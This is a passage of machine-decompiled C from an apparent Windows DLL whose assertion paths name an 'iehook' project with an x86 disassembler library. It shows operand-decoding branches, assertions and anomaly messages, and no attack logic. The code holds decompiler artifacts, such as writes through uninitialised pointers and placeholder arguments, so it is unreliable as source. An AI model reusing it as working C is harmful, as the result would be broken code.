                                    if (v939 != 2) {
                                        int32_t v940 = (int32_t)v939 - 4; // 0x100077b9
                                        if (v940 != 0 == (v940 != 4)) {
                                            // 0x1000b0e3
                                            *(int32_t *)(v63 - 4) = 3947;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                    }
                                    int32_t * v941 = (int32_t *)(v79 + 16); // 0x100077d1
                                    *v941 = (int32_t)(v42 | 32);
                                    if ((*v936 & 0x4000) != 0) {
                                        // 0x100077dc
                                        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                        char v942 = *v29; // 0x100077f0
                                        *v29 = v942 + 16 & 48 | v942 & -49;
                                        if (v75 >= 2) {
                                            // 0x10007810
                                            *(int32_t *)(v63 - 4) = 3951;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                            __wassert();
                                        }
                                    }
                                    // 0x1000782a
                                    if ((*v936 & 0x2000) != 0) {
                                        // 0x10007832
                                        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                        *v29 = *v29 + 64;
                                    }
                                    // 0x1000785b
                                    v74 = v69;
                                    v67 = v63;
                                    if ((a3 & 2) == 0) {
                                        goto lab_0x1000af15;
                                    } else {
                                        unsigned char v943 = *v18; // 0x10007865
                                        int32_t v944 = v943; // 0x10007865
                                        int32_t * v945 = (int32_t *)(v63 - 4); // 0x10007888
                                        *v945 = *(int32_t *)(4 * *v941 + (int32_t)&g68);
                                        int32_t * v946 = (int32_t *)(v63 - 8); // 0x10007889
                                        *v946 = v943 == -1 ? 0 : 256 - v944;
                                        int32_t * v947 = (int32_t *)(v63 - 12); // 0x10007891
                                        *v947 = v19 + v944;
                                        int32_t v948 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10007892
                                        unsigned char v949 = *v18 + (char)v948; // 0x10007897
                                        *v18 = v949;
                                        v74 = v69;
                                        v67 = v63;
                                        if ((a3 & 16) == 0) {
                                            goto lab_0x1000af15;
                                        } else {
                                            // 0x100078b0
                                            *(char *)(v19 + (int32_t)v949) = 123;
                                            *v18 = *v18 + 1;
                                            int32_t v950 = *v936; // 0x100078be
                                            int32_t v951 = v950; // 0x100078c4
                                            if ((v950 & 0xe000) == 0) {
                                                // 0x100078c6
                                                *v945 = 3955;
                                                *v946 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *v947 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                                __wassert();
                                                v951 = *v936;
                                            }
                                            int32_t v952 = v951; // 0x100078e3
                                            if ((v951 & 0x200000) != 0) {
                                                // 0x100078e5
                                                *(char *)(v19 + (int32_t)*v18) = 114;
                                                *v18 = *v18 + 1;
                                                v952 = *v936;
                                            }
                                            int32_t v953 = v952; // 0x100078fd
                                            if ((v952 & 0x100000) != 0) {
                                                // 0x100078ff
                                                *(char *)(v19 + (int32_t)*v18) = 102;
                                                *v18 = *v18 + 1;
                                                v953 = *v936;
                                            }
                                            int32_t v954 = v953; // 0x10007917
                                            if ((v953 & 1024) != 0) {
                                                // 0x10007919
                                                *(char *)(v19 + (int32_t)*v18) = 99;
                                                *v18 = *v18 + 1;
                                                v954 = *v936;
                                            }
                                            // 0x1000792b
                                            v72 = v69;
                                            v61 = v954;
                                            v65 = v63;
                                            if ((int16_t)v954 > -1) {
                                                goto lab_0x1000ae34;
                                            } else {
                                                // 0x10007938
                                                *(char *)(v19 + (int32_t)*v18) = 88;
                                                v73 = v69;
                                                v66 = v63;
                                                goto lab_0x1000ae47;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        if (v801 == 0x40000) {
                            // 0x100082f0
                            if ((*v2 & 8) == 0) {
                                // 0x100082f9
                                *(int32_t *)(v63 - 4) = 4008;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                __wassert();
                            }
                            if ((v6 & 3) == 3 == v81 == 0x4000000) {
                                // 0x1000b15f
                                if (v16 != 0) {
                                    goto lab_0x1000af28;
                                } else {
                                    uint32_t v955 = *v21; // 0x1000b169
                                    uint32_t v956 = *v23 + v955; // 0x1000b170
                                    int32_t * v957 = (int32_t *)(v63 - 4);
                                    *v957 = v1 + 696;
                                    *(int32_t *)(v63 - 8) = *v24 + v955 / 0x80000000 + (int32_t)(v956 < v955);
                                    *(int32_t *)(v63 - 12) = v956;
                                    *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: mod = 3 for AMODE_E with OPTYPE_p (\"%s\")\n";
                                    _printf((char *)&g173);
                                    v803 = v957;
                                    goto lab_0x1000b50b;
                                }
                            }
                            int32_t * v958 = (int32_t *)(v63 - 4); // 0x10008333
                            *v958 = v16;
                            int32_t * v959 = (int32_t *)(v63 - 8); // 0x10008334
                            *v959 = v78;
                            int32_t * v960 = (int32_t *)(v63 - 12); // 0x10008335
                            *v960 = v79;
                            *(int32_t *)(v63 - 16) = v69;
                            int32_t v961 = function_10002c20((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10008339
                            if (v961 == 0) {
                              lab_0x1000af28:
                                // 0x1000af28
                                return 0;
                            }
                            // 0x1000834c
                            v74 = v961;
                            v67 = v63;
                            if ((a3 & 4) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                int32_t v962 = *v34; // 0x10008356
                                v815 = v63;
                                v818 = v961;
                                if (v962 != 2049 != v962 != 2050) {
                                    int16_t v963 = (int16_t)(*v26 & 15);
                                    int16_t * v964 = (int16_t *)(v79 + 6); // 0x1000837a
                                    int16_t v965 = v963; // 0x1000837e
                                    if (*v964 > v963) {
                                        // 0x10008380
                                        *v958 = 4020;
                                        *v959 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v960 = (int32_t)L"X86Instruction->OperandSize >= Operand->Length";
                                        __wassert();
                                        v965 = (int16_t)(*v26 & 15);
                                    }
                                    // 0x10008397
                                    *v964 = v965;
                                    v815 = v63;
                                    v818 = v961;
                                }
                                goto lab_0x1000a0af;
                            }
                        } else {
                            if (v801 != 0x50000) {
                                // 0x1000b524
                                *(int32_t *)(v63 - 4) = 4063;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                __wassert();
                                return 0;
                            }
                            // 0x100080c2
                            if ((*v2 & 8) == 0) {
                                // 0x100080cb
                                *(int32_t *)(v63 - 4) = 3858;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                __wassert();
                            }
                            // 0x100080e5
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 4) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                // 0x100080ef
                                v826 = (int32_t *)v79;
                                *v826 = *v826 | 128;
                                v827 = (int16_t *)(v79 + 6);
                                uint16_t v966 = *v827; // 0x100080f5
                                g156 = (int32_t)v966 - 1;
                                switch (v966) {
                                    case 1: {
                                        // 0x1000813c
                                        *(int32_t *)(v79 + 16) = v53;
                                        v809 = v53;
                                        if (*v31 == 0) {
                                            goto lab_0x10008161;
                                        } else {
                                            goto lab_0x10008152;
                                        }
                                    }
                                    case 2: {
                                        // 0x1000812d
                                        *(int32_t *)(v79 + 16) = v52;
                                        v809 = v52;
                                        goto lab_0x10008152;
                                    }
                                    case 4: {
                                        // 0x1000811c
                                        *(int32_t *)(v79 + 16) = v51;
                                        v809 = v51;
                                        goto lab_0x10008152;
                                    }
                                    case 8: {
                                        // 0x1000810a
                                        *(int32_t *)(v79 + 16) = (int32_t)(v42 | -48);
                                        goto lab_0x10008161;
                                    }
                                    default: {
                                        // 0x1000b140
                                        *(int32_t *)(v63 - 4) = 3867;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                if (v801 < 0x90001) {
                    switch (v801) {
                        case 0x90000: {
                            char * v967 = (char *)(v79 + 4); // 0x1000911e
                            *v967 = *v967 & -64 | 2;
                            v823 = (int32_t *)v79;
                            *v823 = *v823 | 0x10000;
                            char v968 = *v25; // 0x10009130
                            if ((v968 & 16) != 0) {
                                goto lab_0x100091b7;
                            } else {
                                // 0x10009139
                                if ((*v28 & 2) == 0) {
                                    goto lab_0x100091b7;
                                } else {
                                    char v969 = v968; // 0x10009146
                                    if (v16 == 0) {
                                        uint32_t v970 = *v21; // 0x10009148
                                        uint32_t v971 = *v23 + v970; // 0x1000914f
                                        *(int32_t *)(v63 - 4) = *v24 + v970 / 0x80000000 + (int32_t)(v971 < v970);
                                        *(int32_t *)(v63 - 8) = v971;
                                        *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Unexpected operand size prefix\n";
                                        _printf((char *)&g173);
                                        v969 = *v25;
                                    }
                                    // 0x1000916a
                                    *v25 = v969 | 16;
                                    *v28 = *v28 & -3;
                                    char v972 = *v26; // 0x10009178
                                    switch (v972 & 15) {
                                        case 2: {
                                            // 0x100091b1
                                            *v26 = v972 & -16 | 4;
                                            goto lab_0x100091b7;
                                        }
                                        case 4: {
                                            // 0x100091b1
                                            *v26 = v972 & -16 | 2;
                                            goto lab_0x100091b7;
                                        }
                                        default: {
                                            // 0x1000918e
                                            *(int32_t *)(v63 - 4) = 3589;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            goto lab_0x100091b7;
                                        }
                                    }
                                }
                            }
                        }
                        case 0x70000: {
                            char v973 = *v25; // 0x100089b3
                            if ((v973 & 16) == 0) {
                                // 0x100089bc
                                if ((*v28 & 4) != 0) {
                                    char v974 = v973; // 0x100089c9
                                    if (v16 == 0) {
                                        uint32_t v975 = *v21; // 0x100089cb
                                        uint32_t v976 = *v23 + v975; // 0x100089d2
                                        *(int32_t *)(v63 - 4) = *v24 + v975 / 0x80000000 + (int32_t)(v976 < v975);
                                        *(int32_t *)(v63 - 8) = v976;
                                        *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                                        _printf((char *)&g173);
                                        v974 = *v25;
                                    }
                                    // 0x100089ed
                                    *v25 = v974 | 16;
                                }
                            }
                            // 0x100089f4
                            *v28 = *v28 & -5;
                            int32_t v977 = *(int32_t *)(*v27 + 4); // 0x100089fe
                            switch (v977) {
                                case 1: {
                                    // 0x10008a30
                                    *v26 = *v26 & 15 | 64;
                                    // break -> 0x10008a42
                                    break;
                                }
                                case 2: {
                                    // 0x10008a1c
                                    *v26 = *v26 & 15 | 32;
                                    // break -> 0x10008a42
                                    break;
                                }
                                default: {
                                    if (v977 == 3) {
                                        // 0x10008a0a
                                        *v26 = *v26 & 15 | -128;
                                    }
                                    // break -> 0x10008a42
                                    break;
                                }
                            }
                            if ((a3 & 4) == 0) {
                                // 0x10008a42
                                v805 = (int16_t *)(v79 + 6);
                                goto lab_0x10008b36;
                            } else {
                                // 0x10008a4c
                                v828 = (int32_t *)v79;
                                *v828 = *v828 | 0x210180;
                                char * v978 = (char *)(v79 + 4); // 0x10008a52
                                *v978 = *v978 & -64 | 2;
                                unsigned char v979 = *v26 & 15;
                                if (v979 == 2) {
                                    // 0x10008a8b
                                    *(int32_t *)(v79 + 16) = 9;
                                } else {
                                    int32_t v980 = (int32_t)v979 - 4; // 0x10008a6b
                                    if (v980 == 0) {
                                        // 0x10008a82
                                        *(int32_t *)(v79 + 16) = 10;
                                    } else {
                                        if (v980 != 4) {
                                            // 0x1000b1ee
                                            *(int32_t *)(v63 - 4) = 3544;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                        // 0x10008a79
                                        *(int32_t *)(v79 + 16) = 11;
                                    }
                                }
                                // 0x10008a92
                                v829 = (int16_t *)(v79 + 6);
                                uint16_t v981 = *v829; // 0x10008a92
                                g160 = (int32_t)v981 - 1;
                                switch (v981) {
                                    case 1: {
                                        // 0x10008ac6
                                        v811 = (int32_t)*(char *)v69;
                                        goto lab_0x10008acc;
                                    }
                                    case 2: {
                                        // 0x10008abe
                                        v811 = (int32_t)*(int16_t *)v69;
                                        goto lab_0x10008acc;
                                    }
                                    case 4: {
                                        // 0x10008ab7
                                        v811 = *(int32_t *)v69;
                                        goto lab_0x10008acc;
                                    }
                                    case 8: {
                                        // 0x10008aa7
                                        *v45 = *(int32_t *)v69;
                                        v813 = *(int32_t *)(v69 + 4);
                                        goto lab_0x10008ad3;
                                    }
                                    default: {
                                        // 0x1000b20d
                                        *(int32_t *)(v63 - 4) = 3552;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                }
                            }
                        }
                        default: {
                            if (v801 != 0x80000) {
                                // 0x1000b524
                                *(int32_t *)(v63 - 4) = 4063;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                __wassert();
                                return 0;
                            }
                            // 0x10008934
                            if ((*v2 & 8) == 0) {
                                // 0x1000893d
                                *(int32_t *)(v63 - 4) = 3995;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                __wassert();
                            }
                            if ((v6 & 3) == 3) {
                                // 0x1000b1b6
                                if (v16 != 0) {
                                    goto lab_0x1000af28;
                                } else {
                                    uint32_t v982 = *v21; // 0x1000b1c0
                                    int32_t * v983 = (int32_t *)(v63 - 4);
                                    *v983 = v1 + 696;
                                    uint32_t v984 = *v23 + v982; // 0x1000b1ce
                                    *(int32_t *)(v63 - 8) = *v24 + v982 / 0x80000000 + (int32_t)(v984 < v982);
                                    *(int32_t *)(v63 - 12) = v984;
                                    *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: mod = 3 for AMODE_M (\"%s\")\n";
                                    _printf((char *)&g173);
                                    v803 = v983;
                                    goto lab_0x1000b50b;
                                }
                            }
                            // 0x10008963
                            if (*v37 != 3) {
                                // 0x1000896c
                                if ((*v28 & 8) == 0) {
                                    // 0x10008975
                                    *(int32_t *)(v63 - 4) = 4001;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->Segment == SEG_DS || X86Instruction->HasSegmentOverridePrefix";
                                    __wassert();
                                }
                            }
                            goto lab_0x1000898c;
                        }
                    }
                } else {
                    if (v801 != 0xa0000) {
                        // 0x1000b524
                        *(int32_t *)(v63 - 4) = 4063;
                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                        __wassert();
                        return 0;
                    }
                    // 0x10009676
                    if ((*v2 & 8) == 0) {
                        // 0x1000967f
                        *(int32_t *)(v63 - 4) = 3785;
                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                        __wassert();
                    }
                    if ((v5 & 8) != 0) {
                        // 0x1000b24b
                        if (v16 != 0) {
                            goto lab_0x1000af28;
                        } else {
                            // 0x1000b255
                            *(int32_t *)(v63 - 4) = v1 + 696;
                            uint32_t v985 = *v21; // 0x1000b260
                            uint32_t v986 = *v23 + v985; // 0x1000b26a
                            *(int32_t *)(v63 - 8) = v43;
                            int32_t v987 = *v24; // 0x1000b271
                            *(int32_t *)(v63 - 12) = v987 + v985 / 0x80000000 + (int32_t)(v986 < v985);
                            *(int32_t *)(v63 - 16) = v986;
                            int32_t v988 = v63 - 20; // 0x1000b279
                            *(int32_t *)v988 = (int32_t)"[0x%08I64X] ERROR: invalid mmx register %d for AMODE_P (\"%s\")\n";
                            v816 = v988;
                            goto lab_0x1000b503;
                        }
                    }
                    // 0x100096aa
                    if ((*v26 & 15) == 2) {
                        // 0x1000b283
                        if (v16 != 0) {
                            goto lab_0x1000af28;
                        } else {
                            uint32_t v989 = *v21; // 0x1000b28d
                            int32_t * v990 = (int32_t *)(v63 - 4);
                            *v990 = v1 + 696;
                            uint32_t v991 = *v23 + v989; // 0x1000b29b
                            *(int32_t *)(v63 - 8) = *v24 + v989 / 0x80000000 + (int32_t)(v991 < v989);
                            *(int32_t *)(v63 - 12) = v991;
                            *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: AMODE_P illegal in 16-bit mode (\"%s\")\n";
                            _printf((char *)&g173);
                            v803 = v990;
                            goto lab_0x1000b50b;
                        }
                    }
                    // 0x100096bc
                    v74 = v69;
                    v67 = v63;
                    if ((a3 & 4) == 0) {
                        goto lab_0x1000af15;
                    } else {
                        int32_t * v992 = (int32_t *)v79; // 0x100096c6
                        *v992 = *v992 | 128;
                        int32_t * v993 = (int32_t *)(v79 + 16); // 0x100096d5
                        *v993 = (int32_t)(v42 | 80);
                        if ((*v992 & 0x4000) != 0) {
                            // 0x100096e0
                            *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                            char v994 = *v29; // 0x100096f4
                            *v29 = v994 + 16 & 48 | v994 & -49;
                            if (v75 >= 2) {
                                // 0x10009714
                                *(int32_t *)(v63 - 4) = 3800;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                __wassert();
                            }
                        }
                        // 0x1000972e
                        if ((*v992 & 0x2000) != 0) {
                            // 0x10009736
                            *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                            *v29 = *v29 + 64;
                        }
                        // 0x1000975f
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 2) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            unsigned char v995 = *v18; // 0x10009769
                            int32_t v996 = v995; // 0x10009769
                            int32_t v997 = *(int32_t *)(4 * *v993 + (int32_t)&g68); // 0x10009785
                            *(int32_t *)(v63 - 4) = v997;
                            *(int32_t *)(v63 - 8) = v995 == -1 ? 0 : 256 - v996;
                            *(int32_t *)(v63 - 12) = v19 + v996;
                            int32_t v998 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10009796
                            unsigned char v999 = *v18 + (char)v998; // 0x1000979b
                            *v18 = v999;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 16) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                // 0x100097b4
                                *(char *)(v19 + (int32_t)v999) = 123;
                                *v18 = *v18 + 1;
                                int32_t v1000 = *v992; // 0x100097c2
                                if ((v1000 & 0xe000) == 0) {
                                    // 0x100097ca
                                    int32_t * v1001; // 0x1000978c
                                    *v1001 = 3805;
                                    int32_t * v1002; // 0x1000978d
                                    *v1002 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    int32_t * v1003; // 0x10009795
                                    *v1003 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                    __wassert();
                                }
                                int32_t v1004 = v1000; // 0x100097e7
                                if ((v1000 & 0x200000) != 0) {
                                    // 0x100097e9
                                    *(char *)(v19 + (int32_t)*v18) = 114;
                                    *v18 = *v18 + 1;
                                    v1004 = *v992;
                                }
                                int32_t v1005 = v1004; // 0x10009801
                                if ((v1004 & 0x100000) != 0) {
                                    // 0x10009803
                                    *(char *)(v19 + (int32_t)*v18) = 102;
                                    *v18 = *v18 + 1;
                                    v1005 = *v992;
                                }
                                int32_t v1006 = v1005; // 0x1000981b
                                if ((v1005 & 1024) != 0) {
                                    // 0x1000981d
                                    *(char *)(v19 + (int32_t)*v18) = 99;
                                    *v18 = *v18 + 1;
                                    v1006 = *v992;
                                }
                                // 0x1000982f
                                v72 = v69;
                                v61 = v1006;
                                v65 = v63;
                                if ((int16_t)v1006 > -1) {
                                    goto lab_0x1000ae34;
                                } else {
                                    // 0x1000983c
                                    *(char *)(v19 + (int32_t)*v18) = 88;
                                    v73 = v69;
                                    v66 = v63;
                                    goto lab_0x1000ae47;
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        if (v801 < 0x110001) {
            if (v801 == 0x110000) {
                // 0x1000a2d6
                v74 = v69;
                v67 = v63;
                if ((a3 & 4) == 0) {
                    goto lab_0x1000af15;
                } else {
                    int32_t * v1007 = (int32_t *)v79; // 0x1000a2e0
                    *v1007 = *v1007 | 0x10080;
                    char * v1008 = (char *)(v79 + 4); // 0x1000a2e6
                    *v1008 = *v1008 & -64 | 5;
                    unsigned char v1009 = *v26; // 0x1000a2f0
                    int32_t * v1010; // 0x10003490
                    int32_t v1011; // 0x10003490
                    switch (v1009 / 16) {
                        case 2: {
                            int32_t * v1012 = (int32_t *)(v79 + 16);
                            *v1012 = 134;
                            v1011 = 134;
                            v1010 = v1012;
                            // break -> 0x1000a326
                            break;
                        }
                        case 4: {
                            int32_t * v1013 = (int32_t *)(v79 + 16);
                            *v1013 = 150;
                            v1011 = 150;
                            v1010 = v1013;
                            // break -> 0x1000a326
                            break;
                        }
                        default: {
                            if ((v1009 ^ -128) >= 16) {
                                // 0x1000b3c0
                                *(int32_t *)(v63 - 4) = 3665;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                __wassert();
                                return 0;
                            }
                            int32_t * v1014 = (int32_t *)(v79 + 16);
                            *v1014 = 214;
                            v1011 = 214;
                            v1010 = v1014;
                            // break -> 0x1000a326
                            break;
                        }
                    }
                    int32_t * v1015 = v1010;
                    *v35 = v1011;
                    char v1016 = *v2; // 0x1000a32f
                    char v1017 = v1016 | 16; // 0x1000a32f
                    *v2 = v1017;
                    int32_t v1018 = *v1007; // 0x1000a336
                    int32_t v1019 = v1018; // 0x1000a342
                    if ((v1018 & 0x4000) != 0) {
                        char v1020 = v1017; // 0x1000a346
                        if ((v1016 & 2) != 0) {
                            // 0x1000a348
                            *(int32_t *)(v63 - 4) = 3670;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
                            __wassert();
                            v1020 = *v2;
                        }
                        // 0x1000a362
                        *v2 = v1020 | 2;
                        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                        char v1021 = *v29; // 0x1000a37d
                        *v29 = v1021 & -52 | v75 & 3 | v1021 + 16 & 48;
                        v1019 = *v1007;
                    }
                    // 0x1000a39e
                    if ((v1019 & 0x2000) != 0) {
                        // 0x1000a3a6
                        if (*v34 != 0x4001) {
                            // 0x1000a3b2
                            if ((*v2 & 4) != 0) {
                                // 0x1000a3bb
                                *(int32_t *)(v63 - 4) = 3670;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                                __wassert();
                            }
                        }
                        // 0x1000a3d5
                        *v2 = *v2 | 4;
                        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                        char v1022 = *v29; // 0x1000a3ed
                        *v29 = v1022 & 51 | 4 * v75 & 12 | v1022 + 64 & -64;
                    }
                    // 0x1000a411
                    if ((*v28 & 8) == 0) {
                        // 0x1000a41a
                        *v37 = 3;
                    }
                    // 0x1000a424
                    v74 = v69;
                    v67 = v63;
                    if ((a3 & 2) == 0) {
                        goto lab_0x1000af15;
                    } else {
                        unsigned char v1023 = *v18; // 0x1000a42e
                        int32_t v1024 = v1023; // 0x1000a42e
                        int32_t v1025 = *(int32_t *)(4 * *v1015 + (int32_t)&g68); // 0x1000a44a
                        int32_t * v1026 = (int32_t *)(v63 - 4); // 0x1000a451
                        *v1026 = v1025;
                        int32_t * v1027 = (int32_t *)(v63 - 8); // 0x1000a45f
                        *v1027 = *(int32_t *)(4 * *v37 + (int32_t)&g46);
                        int32_t * v1028 = (int32_t *)(v63 - 12); // 0x1000a460
                        *v1028 = (int32_t)"%s:[%s]";
                        *(int32_t *)(v63 - 16) = v1023 == -1 ? 0 : 256 - v1024;
                        *(int32_t *)(v63 - 20) = v19 + v1024;
                        int32_t v1029 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000a46e
                        unsigned char v1030 = *v18 + (char)v1029; // 0x1000a473
                        *v18 = v1030;
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 16) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x1000a48c
                            *(char *)(v19 + (int32_t)v1030) = 123;
                            *v18 = *v18 + 1;
                            int32_t v1031 = *v1007; // 0x1000a49a
                            int32_t v1032 = v1031; // 0x1000a4a0
                            if ((v1031 & 0xe000) == 0) {
                                // 0x1000a4a2
                                *v1026 = 3678;
                                *v1027 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *v1028 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                __wassert();
                                v1032 = *v1007;
                            }
                            int32_t v1033 = v1032; // 0x1000a4bf
                            if ((v1032 & 0x200000) != 0) {
                                // 0x1000a4c1
                                *(char *)(v19 + (int32_t)*v18) = 114;
                                *v18 = *v18 + 1;
                                v1033 = *v1007;
                            }
                            int32_t v1034 = v1033; // 0x1000a4d9
                            if ((v1033 & 0x100000) != 0) {
                                // 0x1000a4db
                                *(char *)(v19 + (int32_t)*v18) = 102;
                                *v18 = *v18 + 1;
                                v1034 = *v1007;
                            }
                            int32_t v1035 = v1034; // 0x1000a4f3
                            if ((v1034 & 1024) != 0) {
                                // 0x1000a4f5
                                *(char *)(v19 + (int32_t)*v18) = 99;
                                *v18 = *v18 + 1;
                                v1035 = *v1007;
                            }
                            // 0x1000a507
                            v72 = v69;
                            v61 = v1035;
                            v65 = v63;
                            if ((int16_t)v1035 > -1) {
                                goto lab_0x1000ae34;
                            } else {
                                // 0x1000a514
                                *(char *)(v19 + (int32_t)*v18) = 88;
                                v73 = v69;
                                v66 = v63;
                                goto lab_0x1000ae47;
                            }
                        }
                    }
                }
            } else {
                if (v801 < 0xe0001) {
                    switch (v801) {
                        case 0xe0000: {
                            // 0x10009dc8
                            if ((*v2 & 8) == 0) {
                                // 0x10009dd1
                                *(int32_t *)(v63 - 4) = 3905;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                __wassert();
                            }
                            // 0x10009deb
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 4) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                // 0x10009df5
                                *v33 = *v33 | 0x80000;
                                *v25 = *v25 | 2;
                                int32_t * v1036 = (int32_t *)v79; // 0x10009e06
                                *v1036 = *v1036 | 128;
                                unsigned char v1037 = *v26 & 15;
                                if (v1037 != 2) {
                                    int32_t v1038 = (int32_t)v1037 - 4; // 0x10009e1b
                                    if (v1038 != 0 == (v1038 != 4)) {
                                        // 0x1000b369
                                        *(int32_t *)(v63 - 4) = 3918;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                }
                                int32_t * v1039 = (int32_t *)(v79 + 16); // 0x10009e33
                                *v1039 = (int32_t)(v42 | 16);
                                if ((*v1036 & 0x4000) != 0) {
                                    // 0x10009e3e
                                    *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                    char v1040 = *v29; // 0x10009e52
                                    *v29 = v1040 + 16 & 48 | v1040 & -49;
                                    if (v75 >= 2) {
                                        // 0x10009e72
                                        *(int32_t *)(v63 - 4) = 3922;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                        __wassert();
                                    }
                                }
                                // 0x10009e8c
                                if ((*v1036 & 0x2000) != 0) {
                                    // 0x10009e94
                                    *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                    *v29 = *v29 + 64;
                                }
                                // 0x10009ebd
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 2) == 0) {
                                    goto lab_0x1000af15;
